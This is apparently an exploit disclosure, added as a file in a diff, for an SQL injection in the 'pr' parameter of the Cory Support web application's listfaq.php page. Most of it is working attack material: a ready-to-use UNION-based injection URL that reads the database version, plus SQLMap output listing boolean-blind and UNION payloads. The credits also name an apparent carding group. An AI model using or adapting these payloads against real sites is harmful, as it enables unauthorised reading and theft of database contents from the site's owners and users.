@@ -1,0 +1,38 @@
+# Exploit   : Cory Support (pr) SQL Injection Vulnerability
+# Author    : v3n0m
+# Contact   : v3n0m[at]outlook[dot]com
+# Date      : September, 06-2017 GMT +7:00 Jakarta, Indonesia
+# Developer : Cory App
+# Software  : Cory Support
+# App Link  : http://coryapp.com/?product&index
+# Demo      : http://coryapp.com/demo/support/
+# Tested On : Mac OS Sierra v10.12.6
+# Credits   : YOGYACARDERLINK, Dhea Dayanaya Fathin Karima, Don't Touch Me (Line Group) & Muhammad Panji, Alfath Dirk, Cafe BMW & YOU !!
+ 
+1. Description
+ 
+An attacker can exploit this vulnerability to read from the database.
+The parameter 'pr' is vulnerable.
+ 
+ 
+2. Proof of Concept
+ 
+http://domain.tld/[path]/listfaq.php?pr=9999+and+1=2+union+all+select+null,version()--
+ 
+# Exploitation via SQLMap
+ 
+Parameter: pr (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: pr=1 AND 4809=4809
+    Vector: AND [INFERENCE]
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: pr=1 UNION ALL SELECT NULL,CONCAT(0x7170706271,0x564f724b4475754c4c7a48714c59464c6c43704a636c6f72444471767a79716a6b6d4d6a72654b76,0x7170626b71)-- RNyi
+    Vector:  UNION ALL SELECT NULL,[QUERY][GENERIC_SQL_COMMENT]
+ 
+ 
+3. Security Risk
+ 
+The security risk of the remote sql-injection web vulnerability in the Cory Support is estimated as high.
